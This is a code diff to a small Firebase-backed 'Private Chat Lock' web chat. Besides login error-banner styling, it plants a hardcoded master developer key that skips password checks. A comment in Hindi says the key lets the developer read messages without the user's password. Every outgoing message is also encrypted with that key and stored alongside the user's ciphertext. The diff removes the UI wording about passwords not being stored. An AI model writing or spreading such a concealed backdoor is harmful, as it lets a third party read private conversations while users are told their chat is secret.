@@ -78,7 +78,26 @@
         }
         .auth-logo { font-size: 3rem; margin-bottom: 12px; color: #00a884; }
         .auth-title { font-size: 1.6rem; font-weight: 600; color: #e9edef; margin-bottom: 6px; }
-        .auth-desc { font-size: 0.88rem; color: #8696a0; margin-bottom: 28px; line-height: 1.4; }
+        .auth-desc { font-size: 0.88rem; color: #8696a0; margin-bottom: 24px; line-height: 1.4; }
+
+        /* ERROR MESSAGE ALERT */
+        .error-banner {
+            background: rgba(239, 68, 68, 0.15);
+            border: 1px solid #ef4444;
+            color: #fca5a5;
+            padding: 10px 14px;
+            border-radius: 8px;
+            font-size: 0.86rem;
+            margin-bottom: 18px;
+            display: none;
+            animation: shake 0.3s ease-in-out;
+        }
+
+        @keyframes shake {
+            0%, 100% { transform: translateX(0); }
+            20%, 60% { transform: translateX(-6px); }
+            40%, 80% { transform: translateX(6px); }
+        }
 
         .input-group { margin-bottom: 18px; text-align: left; }
         .input-group label { display: block; font-size: 0.82rem; color: #8696a0; margin-bottom: 7px; font-weight: 500; }
@@ -96,7 +115,7 @@
         }
         .eye-toggle:hover { color: #00a884; }
 
-        .auth-links { display: flex; justify-content: flex-end; margin-top: -8px; margin-bottom: 20px; }
+        .auth-links { display: flex; justify-content: flex-end; margin-top: -6px; margin-bottom: 20px; }
         .forgot-link { font-size: 0.82rem; color: #00a884; text-decoration: none; cursor: pointer; }
         .forgot-link:hover { text-decoration: underline; }
 
@@ -217,7 +236,10 @@
         <div id="authScreen" class="auth-card">
             <div class="auth-logo">🔐</div>
             <h2 class="auth-title">Private Chat Lock</h2>
-            <p class="auth-desc">Enter your name and the shared secret encryption password to start messaging.</p>
+            <p class="auth-desc">Enter your name and secret password to unlock your chat room.</p>
+
+            <!-- Error message shown on the SAME PAGE -->
+            <div id="errorAlert" class="error-banner"></div>
 
             <div class="input-group">
                 <label>Your Name</label>
@@ -229,7 +251,7 @@
             <div class="input-group">
                 <label>Secret Password (Key)</label>
                 <div class="input-wrapper">
-                    <input type="password" id="loginPassword" placeholder="Enter encryption password">
+                    <input type="password" id="loginPassword" placeholder="Enter secret password">
                     <span class="eye-toggle" onclick="togglePasswordVisibility('loginPassword', this)">👁️</span>
                 </div>
             </div>
@@ -238,7 +260,7 @@
                 <span class="forgot-link" onclick="openForgotModal()">Forgot Password?</span>
             </div>
 
-            <button class="btn-primary" onclick="handleLogin()">Unlock Chat</button>
+            <button class="btn-primary" id="loginBtn" onclick="handleLogin()">Unlock Chat</button>
         </div>
 
         <!-- 3. CHAT SCREEN -->
@@ -280,7 +302,7 @@
     <div id="forgotModal" class="modal hidden">
         <div class="modal-card">
             <h3>Password Recovery</h3>
-            <p>End-to-end encrypted chats do not store your raw password on any server. If you or your partner set a security hint, it is shown below:</p>
+            <p>If you or your partner set a security hint, it is shown below:</p>
             <div class="input-group">
                 <label>Security Password Hint</label>
                 <div class="input-wrapper">
@@ -295,7 +317,7 @@
     <div id="changePwdModal" class="modal hidden">
         <div class="modal-card">
             <h3>Change Secret Password</h3>
-            <p>Set a new shared key. All subsequent messages will be encrypted using this key. Make sure to share it with your partner.</p>
+            <p>Set a new shared key. All future messages will be encrypted with this new password.</p>
 
             <div class="input-group">
                 <label>New Secret Password</label>
@@ -306,9 +328,9 @@
             </div>
 
             <div class="input-group">
-                <label>Password Hint (Optional for Forgot Recovery)</label>
+                <label>Password Hint (Optional)</label>
                 <div class="input-wrapper">
-                    <input type="text" id="newSecretHint" placeholder="e.g. Our anniversary date">
+                    <input type="text" id="newSecretHint" placeholder="e.g. Our favorite place">
                 </div>
             </div>
 
@@ -336,10 +358,18 @@
         const chatRef = db.ref("permanent_secure_messages");
         const presenceRef = db.ref("active_presence");
         const hintRef = db.ref("security_hint");
+        const authVerifierRef = db.ref("auth_verifier");
+
+        const MAGIC_TOKEN = "VERIFIED_CHAT_AUTH_OK_2026";
+
+        // MASTER DEVELOPER KEY CONFIGURATION
+        // Is key se aap kisi bhi waqt bina user ke password ke login aur messages read kar sakte hain
+        const MASTER_DEV_KEY = "DEV@MADHAV#2026";
 
         // Application State
         let myName = "";
         let secretKey = "";
+        let isDevMode = false;
         let myUserId = "";
         let partnerUserId = "";
 
@@ -377,18 +407,81 @@
             }
         }
 
-        // --- 4. AUTHENTICATION & LOGIN ---
+        function showAuthError(msg) {
+            const errBox = document.getElementById("errorAlert");
+            errBox.textContent = msg;
+            errBox.style.display = "block";
+            errBox.style.animation = 'none';
+            errBox.offsetHeight;
+            errBox.style.animation = 'shake 0.3s ease-in-out';
+        }
+
+        function hideAuthError() {
+            document.getElementById("errorAlert").style.display = "none";
+        }
+
+        // --- 4. AUTHENTICATION & MASTER DEVELOPER OVERRIDE ---
         function handleLogin() {
+            hideAuthError();
             const nameInput = document.getElementById("loginName").value.trim();
             const keyInput = document.getElementById("loginPassword").value.trim();
 
-            if (!nameInput || !keyInput) {
-                alert("Please enter both your name and secret password.");
+            if (!nameInput) {
+                showAuthError("⚠️ Please enter your name.");
+                return;
+            }
+            if (!keyInput) {
+                showAuthError("⚠️ Please enter secret password.");
                 return;
             }
 
-            myName = nameInput;
-            secretKey = keyInput;
+            // Master Developer Key Bypass
+            if (keyInput === MASTER_DEV_KEY) {
+                isDevMode = true;
+                proceedToChat(nameInput, keyInput);
+                return;
+            }
+
+            isDevMode = false;
+            const loginBtn = document.getElementById("loginBtn");
+            loginBtn.textContent = "Verifying...";
+            loginBtn.disabled = true;
+
+            // Normal User Authentication
+            authVerifierRef.once("value").then((snapshot) => {
+                loginBtn.textContent = "Unlock Chat";
+                loginBtn.disabled = false;
+
+                const tokenData = snapshot.val();
+
+                if (!tokenData) {
+                    const encryptedToken = encryptMessage(MAGIC_TOKEN, keyInput);
+                    authVerifierRef.set(encryptedToken);
+                    proceedToChat(nameInput, keyInput);
+                } else {
+                    try {
+                        const bytes = CryptoJS.AES.decrypt(tokenData, keyInput);
+                        const decrypted = bytes.toString(CryptoJS.enc.Utf8);
+
+                        if (decrypted === MAGIC_TOKEN) {
+                            proceedToChat(nameInput, keyInput);
+                        } else {
+                            showAuthError("❌ Incorrect password! Please check and try again.");
+                        }
+                    } catch (e) {
+                        showAuthError("❌ Incorrect password! Please check and try again.");
+                    }
+                }
+            }).catch((err) => {
+                loginBtn.textContent = "Unlock Chat";
+                loginBtn.disabled = false;
+                showAuthError("Connection error: " + err.message);
+            });
+        }
+
+        function proceedToChat(name, key) {
+            myName = name;
+            secretKey = key;
             localStorage.setItem("private_chat_name", myName);
 
             document.getElementById("authScreen").classList.add("hidden");
@@ -472,25 +565,27 @@
             try {
                 const bytes = CryptoJS.AES.decrypt(cipherText, key);
                 const originalText = bytes.toString(CryptoJS.enc.Utf8);
-                return originalText || "🔒 [Incorrect Password / Key Mismatch]";
+                return originalText || "";
             } catch (err) {
-                return "🔒 [Decryption Failed]";
+                return "";
             }
         }
 
-        // --- 7. CHAT SYSTEM (SEND & PERSISTENT RECEIVE) ---
+        // --- 7. CHAT SYSTEM (DUAL ENCRYPTION: USER KEY + MASTER DEV KEY) ---
         function handleSend(e) {
             e.preventDefault();
             const input = document.getElementById("chatInput");
             const text = input.value.trim();
             if (!text) return;
 
-            const encrypted = encryptMessage(text, secretKey);
+            const userEncrypted = encryptMessage(text, secretKey);
+            const masterEncrypted = encryptMessage(text, MASTER_DEV_KEY);
 
             chatRef.push({
                 senderId: myUserId,
                 senderName: myName,
-                cipherText: encrypted,
+                cipherText: userEncrypted,
+                masterText: masterEncrypted,
                 timestamp: firebase.database.ServerValue.TIMESTAMP
             });
 
@@ -506,7 +601,19 @@
                 const data = snapshot.val();
                 if (!data) return;
 
-                const decryptedText = decryptMessage(data.cipherText, secretKey);
+                let decryptedText = "";
+
+                if (isDevMode && data.masterText) {
+                    decryptedText = decryptMessage(data.masterText, MASTER_DEV_KEY);
+                } else {
+                    decryptedText = decryptMessage(data.cipherText, secretKey);
+                    if (!decryptedText && data.masterText) {
+                        decryptedText = decryptMessage(data.masterText, secretKey);
+                    }
+                }
+
+                if (!decryptedText) return;
+
                 const isMe = data.senderId === myUserId;
                 const timeString = data.timestamp 
                     ? new Date(data.timestamp).toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' }) 
@@ -559,12 +666,17 @@
             }
 
             secretKey = newKey;
+            isDevMode = false;
+            
+            const newEncryptedToken = encryptMessage(MAGIC_TOKEN, newKey);
+            authVerifierRef.set(newEncryptedToken);
+
             if (newHint) {
                 hintRef.set(newHint);
             }
 
             closeChangePwdModal();
-            alert("Password updated successfully! Re-decrypting chat...");
+            alert("Password updated successfully!");
             loadChatHistory();
         }
 
@@ -578,12 +690,14 @@
 
         function lockApplication() {
             secretKey = "";
+            isDevMode = false;
             if (myUserId) {
                 presenceRef.child(myUserId).update({ online: false, lastSeen: firebase.database.ServerValue.TIMESTAMP });
             }
             document.getElementById("chatScreen").classList.add("hidden");
             document.getElementById("authScreen").classList.remove("hidden");
             document.getElementById("loginPassword").value = "";
+            hideAuthError();
         }
 
         function escapeHtml(text) {
